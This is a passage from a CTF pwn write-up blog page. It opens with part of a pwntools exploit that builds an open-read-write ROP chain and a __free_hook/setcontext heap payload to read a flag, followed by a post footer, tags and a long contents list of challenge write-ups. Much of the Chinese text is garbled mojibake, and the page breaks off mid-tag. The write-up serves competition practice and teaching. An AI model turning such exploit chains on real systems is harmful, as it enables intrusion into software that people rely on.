orw = <span class="string">b&#x27;./flag\x00&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">4</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    payload = p64(libc_base + <span class="number">0x154B20</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + <span class="number">0x28</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span>)</span><br><span class="line">    payload += <span class="built_in">bytes</span>(fake_frame)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">b&quot;You can write a byte anywhere&quot;</span>)</span><br><span class="line">    p.send(p64(libc_base + <span class="number">0x1ea2d0</span> + <span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;And what?&quot;</span>)</span><br><span class="line">    p.send(p8(<span class="number">0xff</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Offset:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2280</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x1600</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.send(orw)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾— flag</p>
<p><img src="https://i.loli.net/2021/04/05/abU9Qhx8lmRS6Ad.png" alt="image.png"></p>
<blockquote>
<p> u1s1ç¬”è€…ä¸ªäººæ„Ÿè§‰è¿™ä¸€æ¬¡VNCTFå‡ºçš„é¢˜â€¦è™½ç„¶è¯´èƒ½å¤Ÿè®©äººå­¦åˆ°æ–°çš„ä¸œè¥¿ï¼Œä½†æ˜¯ä¸ªäººæ„Ÿè§‰éƒ¨åˆ†é¢˜è´¨é‡ä¸å¤§è¡Œï¼Œå¥½åƒæ˜¯ä¸ºäº†å‡ºé¢˜è€Œå‡ºé¢˜ï¼ˆxï¼‰ï¼ˆå‡ºé¢˜å¸ˆå‚…è½»ç‚¹é”¤QAQï¼‰ </p>
<p>å¼•ç”¨æŸä¸ª pwn ğŸ‘´ğŸ‘´çš„ä¸€å¥è¯å°±æ˜¯ï¼š<img src="https://i.loli.net/2021/04/05/ByoqAIwVWu1sZgS.png" alt="image.png"></p>
</blockquote>
<h1 id="N1BOOK-Pwn"><a href="#N1BOOK-Pwn" class="headerlink" title="N1BOOK - Pwn"></a>N1BOOK - Pwn</h1><h2 id="ROP-ret2csu-ret2libc"><a href="#ROP-ret2csu-ret2libc" class="headerlink" title="ROP - ret2csu + ret2libc"></a>ROP - ret2csu + ret2libc</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œåªå¼€äº†NX</p>
<p><img src="https://i.loli.net/2021/03/29/f4lVTuZE5S3gzMi.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œç›´æ¥å°±æœ‰ä¸€ä¸ªå¾ˆå¤§çš„æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/03/29/sQNOaThHRcSt6rx.png" alt="image.png"></p>
<p>å¥—æ¿å­åšé¢˜å³å¯ï¼Œæ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>


      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2000/10/12/NOTE-0XFF-PIECES_KNOWLEDGE/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>ä¸Šä¸€é¡µ</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime" title="æ›´æ–°æ—¶é—´"></i>
              2020-09-08 02:09:30
            </span>
            
                  <span class="post-categories">
                    <i class="iconfont icon-bookmark" title="åˆ†ç±»"></i>
                    
                    <span class="span--category">
                      <a href="/categories/CTF/" title="CTF">
                        <b>#</b> CTF
                      </a>
                    </span>
                    
                  </span>
              
                  <span class="post-tags">
                    <i class="iconfont icon-tags" title="æ ‡ç­¾"></i>
                    
                    <span class="span--tag">
                      <a href="/tags/Pwn/" title="Pwn">
                        <b>#</b> Pwn
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="ä¿¡æ¯å®‰å…¨">
                        <b>#</b> ä¿¡æ¯å®‰å…¨
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E5%A0%86/" title="å †">
                        <b>#</b> å †
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/CTF/" title="CTF">
                        <b>#</b> CTF
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Use-After-Free/" title="Use After Free">
                        <b>#</b> Use After Free
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/ret2libc/" title="ret2libc">
                        <b>#</b> ret2libc
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/ret2text/" title="ret2text">
                        <b>#</b> ret2text
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/ROP/" title="ROP">
                        <b>#</b> ROP
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="æ ˆæº¢å‡º">
                        <b>#</b> æ ˆæº¢å‡º
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/ret2shellcode/" title="ret2shellcode">
                        <b>#</b> ret2shellcode
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/shellcode/" title="shellcode">
                        <b>#</b> shellcode
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E5%A0%86%E9%A3%8E%E6%B0%B4/" title="å †é£æ°´">
                        <b>#</b> å †é£æ°´
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/got%E8%A1%A8%E5%8A%AB%E6%8C%81/" title="gotè¡¨åŠ«æŒ">
                        <b>#</b> gotè¡¨åŠ«æŒ
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" title="æ ˆè¿ç§»">
                        <b>#</b> æ ˆè¿ç§»
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/IO-FILE-hijack/" title="_IO_FILE hijack">
                        <b>#</b> _IO_FILE hijack
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Fastbin-Attack/" title="Fastbin Attack">
                        <b>#</b> Fastbin Attack
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/FSOP/" title="FSOP">
                        <b>#</b> FSOP
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Heap-Overflow/" title="Heap Overflow">
                        <b>#</b> Heap Overflow
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/House-of-Force/" title="House of Force">
                        <b>#</b> House of Force
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/House-of-Orange/" title="House of Orange">
                        <b>#</b> House of Orange
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/House-of-Spirit/" title="House of Spirit">
                        <b>#</b> House of Spirit
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/off-by-one/" title="off by one">
                        <b>#</b> off by one
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/one-gadget/" title="one_gadget">
                        <b>#</b> one_gadget
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/python/" title="python">
                        <b>#</b> python
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Unlink/" title="Unlink">
                        <b>#</b> Unlink
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Unsorted-bin-Attack/" title="Unsorted bin Attack">
                        <b>#</b> Unsorted bin Attack
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/canary/" title="canary">
                        <b>#</b> canary
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Integer-Overflow/" title="Integer Overflow">
                        <b>#</b> Integer Overflow
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/off-by-null/" title="off by null">
                        <b>#</b> off by null
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/ret2csu/" title="ret2csu">
                        <b>#</b> ret2csu
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/SROP/" title="SROP">
                        <b>#</b> SROP
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Stack-Smashing-Protect-leak/" title="Stack Smashing Protect leak">
                        <b>#</b> Stack Smashing Protect leak
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/2020/11/23/CTF-0X01-ByteCTF2020-pwn/" target="_self">
                <span>ä¸‹ä¸€é¡µ</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">ç›®å½•</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x000-%E7%BB%AA%E8%AE%BA"><span class="toc-text">0x000.ç»ªè®º</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x001-0x010"><span class="toc-text">0x001 ~ 0x010</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x001-test-your-nc-nc"><span class="toc-text">0x001.test your nc - nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x002-rip-ret2text"><span class="toc-text">0x002.rip - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x003-warmup-csaw-2016-ret2text"><span class="toc-text">0x003.warmup_csaw_2016 - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x004-pwn1-sctf-2016-ret2text"><span class="toc-text">0x004.pwn1_sctf_2016 - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x005-ciscn-2019-n-1-overwrite"><span class="toc-text">0x005.ciscn_2019_n_1 - overwrite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x006-ciscn-2019-c-1-ret2csu-ret2libc"><span class="toc-text">0x006.ciscn_2019_c_1 - ret2csu + ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x007-OGeek2019-babyrop-ret2libc"><span class="toc-text">0x007.[OGeek2019]babyrop - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x008-jarvisoj-level0-ret2text"><span class="toc-text">0x008.jarvisoj_level0 - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x009-ciscn-2019-en-2-ret2csu-ret2libc"><span class="toc-text">0x009.ciscn_2019_en_2 - ret2csu + ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00A-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5-fmtstr"><span class="toc-text">0x00A.[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 - fmtstr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00B-get-started-3dsctf-2016-ret2text-ret2shellcode"><span class="toc-text">0x00B.get_started_3dsctf_2016 - ret2text || ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%951%EF%BC%9Aret2text"><span class="toc-text">è§£æ³•1ï¼šret2text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9Aret2shellcode"><span class="toc-text">è§£æ³•2ï¼šret2shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00C-ciscn-2019-n-8-overwrite"><span class="toc-text">0x00C.ciscn_2019_n_8 - overwrite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00D-not-the-same-3dsctf-2016-ret2shellcode"><span class="toc-text">0x00D.not_the_same_3dsctf_2016 - ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00E-jarvisoj-level2-ret2text"><span class="toc-text">0x00E.jarvisoj_level2 - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00F-HarekazeCTF2019-baby-rop-ret2text-ret2csu"><span class="toc-text">0x00F.[HarekazeCTF2019]baby_rop - ret2text + ret2csu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x010-bjdctf-2020-babystack-ret2text"><span class="toc-text">0x010.bjdctf_2020_babystack - ret2text</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x011-0x020"><span class="toc-text">0x011 ~ 0x020</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x011-babyheap-0ctf-2017-Heap-Overflow-Fastbin-Attack-one-gadget"><span class="toc-text">0x011.babyheap_0ctf_2017 - Heap Overflow + Fastbin Attack + one_gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x012-ciscn-2019-n-5-ret2shellcode"><span class="toc-text">0x012.ciscn_2019_n_5 - ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x013-level2-x64-ret2csu"><span class="toc-text">0x013.level2_x64 - ret2csu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x014-ciscn-2019-ne-5-ret2text"><span class="toc-text">0x014.ciscn_2019_ne_5 - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x015-ciscn-2019-s-3-ret2csu-SROP"><span class="toc-text">0x015.ciscn_2019_s_3 - ret2csu || SROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%951%EF%BC%9Aret2csu"><span class="toc-text">è§£æ³•1ï¼šret2csu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9ASROP"><span class="toc-text">è§£æ³•2ï¼šSROP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x016-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop-ret2libc"><span class="toc-text">0x016.é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x017-bjdctf-2020-babyrop-ret2csu-ret2libc"><span class="toc-text">0x017.bjdctf_2020_babyrop - ret2csu + ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x018-pwn2-sctf-2016-integer-overflow-ret2libc"><span class="toc-text">0x018.pwn2_sctf_2016 - integer overflow + ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x019-others-shellcode"><span class="toc-text">0x019.others_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01A-HarekazeCTF2019-baby-rop2-ret2csu-ret2libc"><span class="toc-text">0x01A.[HarekazeCTF2019]baby_rop2 - ret2csu + ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01B-ez-pz-hackover-2016-ret2shellcode"><span class="toc-text">0x01B.ez_pz_hackover_2016 - ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01C-ciscn-2019-es-2-ret2text-stack-migration"><span class="toc-text">0x01C.ciscn_2019_es_2 - ret2text + stack migration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01D-Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98-PWN-ret2libc-stack-migration"><span class="toc-text">0x01D.[Black Watch å…¥ç¾¤é¢˜]PWN - ret2libc + stack migration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01E-jarvisoj-level3-ret2libc"><span class="toc-text">0x01E.jarvisoj_level3 - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01F-jarvisoj-fm-fmtstr"><span class="toc-text">0x01F.jarvisoj_fm - fmtstr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x020-jarvisoj-tell-me-something-ret2csu-ret2libc"><span class="toc-text">0x020.jarvisoj_tell_me_something - ret2csu + ret2libc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x021-0x030"><span class="toc-text">0x021~0x030</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x021-jarvisoj-level4-ret2libc"><span class="toc-text">0x021.jarvisoj_level4 - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x022-jarvisoj-level3-x64-ret2csu-ret2libc"><span class="toc-text">0x022.jarvisoj_level3_x64 - ret2csu + ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x023-bjdctf-2020-babystack2-integer-overflow-ret2text"><span class="toc-text">0x023.bjdctf_2020_babystack2 - integer overflow + ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x024-hitcontraining-uaf-UAF-fastbin-double-free"><span class="toc-text">0x024.hitcontraining_uaf - UAF + fastbin double free</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x025-ZJCTF-2019-EasyHeap-fastbin-attack"><span class="toc-text">0x025.[ZJCTF 2019]EasyHeap - fastbin attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x026-babyfengshui-33c3-2016-heap-arrangement-got-table-hijack"><span class="toc-text">0x026.babyfengshui_33c3_2016 - heap arrangement + got table hijack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x027-picoctf-2018-rop-chain-ret2libc"><span class="toc-text">0x027.picoctf_2018_rop chain - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x028-bjdctf-2020-babyrop2-fmtstr-ret2libc"><span class="toc-text">0x028.bjdctf_2020_babyrop2 - fmtstr + ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x029-jarvisoj-test-your-memory-ret2text"><span class="toc-text">0x029.jarvisoj_test_your_memory - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02A-bjdctf-2020-router-Linux%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">0x02A.bjdctf_2020_router - LinuxåŸºç¡€çŸ¥è¯†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02B-picoctf-2018-buffer-overflow-1-ret2libc"><span class="toc-text">0x02B.picoctf_2018_buffer overflow 1 - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02C-ZJCTF-2019-Login-ret2text"><span class="toc-text">0x02C.[ZJCTF 2019]Login - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02D-cmcc-simplerop-ret2syscall-ret2shellcode"><span class="toc-text">0x02D.cmcc_simplerop -ret2syscall | ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Aret2syscall"><span class="toc-text">è§£æ³•ä¸€ï¼šret2syscall</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9Aret2shellcode"><span class="toc-text">è§£æ³•äºŒï¼šret2shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02E-roarctf-2019-easy-pwn-off-by-one-fastbin-attack-one-gadget"><span class="toc-text">0x02E.roarctf_2019_easy_pwn - off by one + fastbin attack + one_gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02F-pwnable-orw-orw"><span class="toc-text">0x02F.pwnable_orw - orw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x030-jarvisoj-level1-ret2shellcode-ret2libc"><span class="toc-text">0x030.jarvisoj_level1 - ret2shellcode | ret2libc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x031-0x040"><span class="toc-text">0x031 ~ 0x040</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x031-ciscn-2019-n-3-Use-After-Free"><span class="toc-text">0x031.ciscn_2019_n_3 - Use After Free</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x032-picoctf-2018-buffer-overflow-2-ret2libc"><span class="toc-text">0x032.picoctf_2018_buffer overflow 2 - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x033-wustctf2020-getshell-ret2text"><span class="toc-text">0x033.wustctf2020_getshell - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x034-bbys-tu-2016-ret2text"><span class="toc-text">0x034.bbys_tu_2016 - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x035-xdctf2015-pwn200-ret2libc"><span class="toc-text">0x035.xdctf2015_pwn200 - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x036-gyctf-2020-borrowstack-ret2csu-ret2libc-stack-migration"><span class="toc-text">0x036.gyctf_2020_borrowstack - ret2csu + ret2libc + stack migration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x037-inndy-rop-ret2shellcode-ret2text-ret2syscall-orw"><span class="toc-text">0x037.inndy_rop - ret2shellcode | ret2text | ret2syscall | orw</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Aret2shellcode"><span class="toc-text">è§£æ³•ä¸€ï¼šret2shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9Aret2text-with-ROPgadget"><span class="toc-text">è§£æ³•äºŒï¼šret2text with ROPgadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%89%EF%BC%9Aret2syscall"><span class="toc-text">è§£æ³•ä¸‰ï¼šret2syscall</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E5%9B%9B%EF%BC%9Aorw"><span class="toc-text">è§£æ³•å››ï¼šorw</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x038-axb-2019-fmt32-fmtstr-got-hijack-BROP"><span class="toc-text">0x038.axb_2019_fmt32 - fmtstr + got hijack | BROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Afmtstr-got-hijack"><span class="toc-text">è§£æ³•ä¸€ï¼šfmtstr + got hijack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9ABROP"><span class="toc-text">è§£æ³•äºŒï¼šBROP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x039-others-babystack-partial-overwrite-ret2libc"><span class="toc-text">0x039.others_babystack - partial overwrite + ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03A-mrctf2020-shellcode-shellcode"><span class="toc-text">0x03A.mrctf2020_shellcode - shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03B-hitcontraining-magicheap-unsorted-bin-attack"><span class="toc-text">0x03B.hitcontraining_magicheap - unsorted bin attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03C-ciscn-2019-final-3-Use-After-Free-tcache-poisoning"><span class="toc-text">0x03C.ciscn_2019_final_3 - Use After Free + tcache poisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03D-pwnable-start-ret2shellcode"><span class="toc-text">0x03D.pwnable_start - ret2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03E-hitcontraining-heapcreator-off-by-one-chunk-overlapping"><span class="toc-text">0x03E.hitcontraining_heapcreator - off by one + chunk overlapping</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03F-wustctf2020-getshell-2-ret2text"><span class="toc-text">0x03F.wustctf2020_getshell_2 - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x040-ciscn-2019-s-4-ret2text-stack-migration"><span class="toc-text">0x040.ciscn_2019_s_4 - ret2text + stack migration</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x041-0x050"><span class="toc-text">0x041 ~ 0x050</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x041-mrctf2020-easyoverflow-overflow"><span class="toc-text">0x041.mrctf2020_easyoverflow - overflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x042-0ctf-2017-babyheap-Unsorted-bin-leak-Fastbin-Attack-one-gadget"><span class="toc-text">0x042.0ctf_2017_babyheap - Unsorted bin leak + Fastbin Attack + one_gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x043-wustctf2020-closed-Linux%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">0x043.wustctf2020_closed - LinuxåŸºç¡€çŸ¥è¯†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x044-ciscn-2019-es-7-ret2libc-SROP"><span class="toc-text">0x044.ciscn_2019_es_7 - ret2libc | SROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Aret2libc"><span class="toc-text">è§£æ³•ä¸€ï¼šret2libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9ASROP"><span class="toc-text">è§£æ³•äºŒï¼šSROP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x045-jarvisoj-level5-ret2csu-ret2libc"><span class="toc-text">0x045.jarvisoj_level5 - ret2csu + ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x046-hitcontraining-bamboobox-Heap-Overflow-Fastbin-Attack-one-gadget-Unlink-House-of-Force"><span class="toc-text">0x046.hitcontraining_bamboobox - Heap Overflow + Fastbin Attack + one_gadget | Unlink | House of Force</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9AFastbin-Attack-one-gadget"><span class="toc-text">è§£æ³•ä¸€ï¼šFastbin Attack + one_gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9AUnlink"><span class="toc-text">è§£æ³•äºŒï¼šUnlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%89%EF%BC%9AHouse-of-Force"><span class="toc-text">è§£æ³•ä¸‰ï¼šHouse of Force</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x047-pwnable-hacknote-Use-After-Free-heap-arrangement"><span class="toc-text">0x047.pwnable_hacknote - Use After Free + heap arrangement</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x048-actf-2019-babystack-ret2libc-stack-migration"><span class="toc-text">0x048.actf_2019_babystack - ret2libc + stack migration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x049-hitcon2014-stkof-Unlink-got-hijack-Fastbin-Attack-one-gadget"><span class="toc-text">0x049.hitcon2014_stkof - Unlink + got hijack + Fastbin Attack + one_gadget</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04A-ciscn-2019-es-1-Use-After-Free-tcache-poisoning"><span class="toc-text">0x04A.ciscn_2019_es_1 - Use After Free + tcache poisoning</span></a></li><li class="toc-item 